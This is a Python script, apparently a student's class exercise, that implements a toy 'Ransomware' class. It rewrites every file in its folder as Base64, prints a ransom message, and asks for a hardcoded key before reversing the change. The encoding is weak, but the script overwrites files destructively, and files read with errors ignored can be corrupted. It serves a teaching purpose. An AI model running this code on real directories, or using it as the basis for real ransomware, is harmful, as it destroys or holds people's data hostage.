#!/usr/bin/env python3

"""
Name: Batyr Mammetesenov
Class: CMPSCI 130
Instructor:

WARNING:
Do not run this script outside of a controlled environment.
This script is a simple demonstration of file encryption within a directory.
It is intended for educational purposes only.
"""

import logging  # For logging debug messages.
import os       # For interacting with the operating system (e.g., file paths).
import sys      # For accessing system-specific parameters and functions.
import base64   # For encoding and decoding data using Base64.


class Ransomware:
    """
    This class represents a simple file encryptor for educational purposes.
    """

    def __init__(self, name):
        """Constructor for the Ransomware class."""
        self._name = name

    @property
    def name(self):
        """Getter for the name property."""
        return self._name

    @name.setter
    def name(self, new_name):
        """Setter for the name property."""
        self._name = new_name

    @property
    def key(self):
        """The encryption/decryption key."""
        return "ransomware_key"

    def obtain_key(self):
        """Prompts the user to input a decryption key."""
        return input("Please enter a key: ")

    def ransom_user(self):
        """Informs the user about the encryption of their files."""
        print("Hi, all your files have been encrypted.")

    def encrypt_file(self, filename):
        """
        Encrypts the given file using Base64 encoding.

        :param str filename: Name of the file.
        """
        try:
            # Load the content of the file.
            with open(filename, 'r', encoding='utf-8', errors='ignore') as file:
                content = file.read()

            # Encrypt the file content with Base64 encoding.
            encrypted_data = base64.b64encode(content.encode('utf-8'))

            # Rewrite the file with the encoded content.
            with open(filename, 'w', encoding='utf-8') as file:
                file.write(encrypted_data.decode('utf-8'))

            logging.info(f"Encrypted file: {filename}")

        except Exception as e:
            logging.error(f"Failed to encrypt {filename}: {e}")

    def decrypt_file(self, key, filename):
        """
        Decrypts the given file using Base64 decoding.

        :param str key: Decryption key.
        :param str filename: Name of the file.
        """
        try:
            # Load the content of the file.
            with open(filename, 'r', encoding='utf-8', errors='ignore') as file:
                content = file.read()

            # Decrypt the file content.
            decrypted_data = base64.b64decode(content)

            # Rewrite the file with the decoded content.
            with open(filename, 'w', encoding='utf-8') as file:
                file.write(decrypted_data.decode('utf-8'))

            logging.info(f"Decrypted file: {filename}")

        except Exception as e:
            logging.error(f"Failed to decrypt {filename}: {e}")

    def get_files_in_folder(self, path):
        """
        Returns a list of all files in the folder, excluding certain files.

        :param str path: Path to the folder.
        :return: List of file paths.
        """
        script_name = os.path.basename(sys.argv[0])
        files = []

        for file in os.listdir(path):
            # Skip specified files and directories.
            if file in ('README.md', script_name, '.git', '.', '..'):
                logging.debug(f"Skipping file: {file}")
                continue

            file_path = os.path.join(path, file)

            if os.path.isfile(file_path):
                logging.debug(f"Adding file to list: {file_path}")
                files.append(file_path)
            else:
                logging.debug(f"Skipping non-file: {file_path}")

        return files

    def encrypt_files_in_folder(self, path):
        """
        Encrypts all files in the given directory specified by path.

        :param str path: Path of the folder to be encrypted.
        :returns: Number of encrypted files (int).
        """
        num_encrypted_files = 0
        files = self.get_files_in_folder(path)

        # Encrypt each file in the directory.
        for file in files:
            self.encrypt_file(file)
            num_encrypted_files += 1

        self.ransom_user()
        return num_encrypted_files

    def decrypt_files_in_folder(self, path):
        """
        Decrypts all files in the given directory specified by path.

        :param str path: Path of the folder to be decrypted.
        """
        # Obtain a key from the user.
        key = self.obtain_key()
        if key != self.key:
            print("Sorry, wrong key.")
            return

        files = self.get_files_in_folder(path)

        # Decrypt each file in the directory.
        for file in files:
            self.decrypt_file(key, file)


if __name__ == '__main__':
    logging.basicConfig(level=logging.DEBUG)

    # Create the ransomware object.
    ransomware = Ransomware('SimpleRansomware')

    # Encrypt files located in the same folder as our ransomware.
    path = os.path.dirname(os.path.abspath(__file__))

    number_encrypted_files = ransomware.encrypt_files_in_folder(path)
    print(f'Number of encrypted files: {number_encrypted_files}')

    ransomware.decrypt_files_in_folder(path)
